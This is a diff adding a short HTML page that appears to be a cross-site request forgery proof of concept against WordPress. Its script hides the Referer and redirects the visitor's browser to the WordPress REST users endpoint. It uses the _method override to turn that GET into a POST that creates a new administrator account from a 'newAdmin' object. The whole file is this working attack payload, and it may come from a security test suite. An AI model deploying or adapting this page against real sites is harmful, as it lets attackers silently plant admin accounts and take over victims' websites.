@@ -1,0 +1,8 @@
+<!doctype html>
+<html><head><title>Other site: GET navigation</title><meta name="referrer" content="no-referrer"><script src="common.js"></script></head>
+<body>
+<!-- Top-level GET navigation that WordPress turns into a POST (_method), Referer hidden -->
+<script>
+  location.href = target + '/?' + new URLSearchParams({rest_route: '/wp/v2/users', _method: 'POST', ...newAdmin});
+</script>
+</body></html>
